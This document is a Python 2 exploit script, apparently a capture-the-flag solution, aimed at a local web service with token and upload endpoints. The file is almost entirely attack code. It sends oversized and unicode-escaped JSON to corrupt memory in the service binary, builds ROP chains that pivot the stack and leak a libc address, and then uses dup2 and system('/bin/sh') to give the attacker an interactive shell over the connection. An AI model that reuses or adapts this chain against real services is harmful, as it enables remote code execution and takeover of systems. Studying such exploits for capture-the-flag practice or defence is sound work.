import requests
import zlib
import json
import socket
import pwn
from struct import pack, unpack
from base64 import b64encode
from subprocess import Popen, PIPE


IP = '127.0.0.1'
PORT = 1337


def pretty_print_post(req):
    return '{}\r\n{}\r\n\r\n{}'.format(
        req.method + ' ' + req.path_url + ' HTTP/1.1',
        '\r\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
        req.body,
    )


def gen_token(s, ip, port):
    url = 'http://%s:%s/api/token' % (ip, port)
    return s.get(url).json().get('token')


def unicode_encode(buf):
    res = ''
    for b in buf:
        if ord(b) < 0x20:
            res += r'\u00%02x' % ord(b)
        else:
            res += b
    return res


def get_rop(binary, rop):
    p = Popen(['ROPgadget', '--binary', binary], stdout=PIPE)
    res = p.communicate()[0]
    lines = res.split('\n')
    for l in lines:
        if rop in l:
            addr = int(l.split(' : ')[0], 16)
            return addr
 
    return None


def get_gadget(rop, insts):
    gadget = rop.find_gadget(insts)
    assert(gadget is not None)
    return gadget.address


s = requests.Session()

token = gen_token(s, IP, PORT)

print 'token: ', token

headers = {
    'content-type': 'application/json',
}

url = 'http://%s:%s/api/upload?token=%s' % (IP, PORT, token)

binary_filename = './build/pwn'
binary = pwn.ELF(binary_filename)
binary_rop = pwn.ROP(binary)

libc = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')
bin_sh_offset = next(libc.search('/bin/sh\x00'))

pop_rdi      = get_gadget(binary_rop, ['pop rdi', 'ret'])
pop_rsi      = get_gadget(binary_rop, ['pop rsi', 'ret'])
pop_rdx_rbx  = get_gadget(binary_rop, ['pop rdx', 'pop rbx', 'ret'])
pop_rsp      = get_gadget(binary_rop, ['pop rsp', 'ret'])

read  = binary.plt['read']
write = binary.plt['write']
fcntl = binary.plt['fcntl']

malloc_got    = binary.got['malloc']
malloc_offset = libc.symbols['malloc']
system_offset = libc.symbols['system']
dup2_offset   = libc.symbols['dup2']

static_buf = binary.symbols['g_filebuf'];

payload = \
    pack('<Q', static_buf + 8)

payload += \
    pack('<Q', 0) + \
    pack('<Q', 0xAABBCCDDAABBCCDD) + \
    pack('<Q', static_buf + 32)

new_stack = static_buf + 40

payload += \
    pack('<Q', new_stack)

# rop payload from expolit-1

new_stack = 0x0066f000 + 0x1000

fd = 11

# leak read address
payload += \
    pack('<Q', pop_rdi) + \
    pack('<Q', fd) + \
    pack('<Q', pop_rsi) + \
    pack('<Q', malloc_got) + \
    pack('<Q', pop_rdx_rbx) + \
    pack('<Q', 8) + \
    pack('<Q', 0xAABBCCDDAABBCCDD) + \
    pack('<Q', write)

'''
#define F_DUPFD         0       /* Duplicate file descriptor.  */
#define F_GETFD         1       /* Get file descriptor flags.  */
#define F_SETFD         2       /* Set file descriptor flags.  */
#define F_GETFL         3       /* Get file status flags.  */
#define F_SETFL         4       /* Set file status flags.  */

# define O_NONBLOCK   04000
#define O_RDWR           02
'''

# make fd non-blocking
payload += \
    pack('<Q', pop_rdi) + \
    pack('<Q', fd) + \
    pack('<Q', pop_rsi) + \
    pack('<Q', 4) + \
    pack('<Q', pop_rdx_rbx) + \
    pack('<Q', 02) + \
    pack('<Q', 0xAABBCCDDAABBCCDD) + \
    pack('<Q', fcntl)

# write new rop chain
payload += \
    pack('<Q', pop_rdi) + \
    pack('<Q', fd) + \
    pack('<Q', pop_rsi) + \
    pack('<Q', new_stack) + \
    pack('<Q', pop_rdx_rbx) + \
    pack('<Q', 18 * 8) + \
    pack('<Q', 0xAABBCCDDAABBCCDD) + \
    pack('<Q', read)

# pivot stack
payload += \
    pack('<Q', pop_rsp) + \
    pack('<Q', new_stack)

json_data = {
    'filename': 'tmp',
    'data': b64encode(payload)
}

res = s.post(url, headers=headers, data=json.dumps(json_data))
print res.json()

payload = '{"filename": "%s", "datn": "%s"' % \
    ('A'*400, 'B'*24)

for i in xrange(2):
    payload += ', "b%d": "%s"' % (i, 'C'*48)

payload += '}'

res = s.post(url, headers=headers, data=payload, stream=True)

fileno = res.raw.fileno()

pop_rsp = get_rop(binary_filename, 'mov rsp, qword ptr [rsi] ; ret')

hashtable = \
    pack('<Q', 1) + \
    pack('<Q', 1) + \
    pack('<Q', static_buf) + \
    pack('<Q', 0xAABBCCDDAABBCCDD) + \
    pack('<Q', 0xAABBCCDDAABBCCDD) + \
    pack('<Q', pop_rsp)

hashtable = unicode_encode(hashtable)

p = 'A' * 48 + hashtable * 30

payload = r'{"filename": "name", "datn":"%s\u30"AAAA%s"}' % ('B'*44, p)

req = requests.Request('POST', url, headers=headers, data=payload)

# print pretty_print_post(req.prepare())

s = socket.fromfd(fileno, socket.AF_INET, socket.SOCK_STREAM)

s = pwn.remote.fromsocket(s)

s.send(pretty_print_post(req.prepare()))

malloc_addr = unpack('<Q', s.recv(8))[0]
libc_base = malloc_addr - malloc_offset

system_addr = libc_base + system_offset
dup2_addr   = libc_base + dup2_offset
bin_sh_addr = libc_base + bin_sh_offset

print 'libc base: 0x%x' % libc_base
print 'system:    0x%x' % system_addr
print 'dup2:      0x%x' % dup2_addr
print '/bin/sh:   0x%x' % bin_sh_addr

rop = \
    pack('<Q', pop_rdi) + \
    pack('<Q', fd) + \
    pack('<Q', pop_rsi) + \
    pack('<Q', 0) + \
    pack('<Q', dup2_addr) + \
    pack('<Q', pop_rdi) + \
    pack('<Q', fd) + \
    pack('<Q', pop_rsi) + \
    pack('<Q', 1) + \
    pack('<Q', dup2_addr) + \
    pack('<Q', pop_rdi) + \
    pack('<Q', fd) + \
    pack('<Q', pop_rsi) + \
    pack('<Q', 2) + \
    pack('<Q', dup2_addr) + \
    pack('<Q', pop_rdi) + \
    pack('<Q', bin_sh_addr) + \
    pack('<Q', system_addr)

s.send(rop)

s.interactive()

s.close()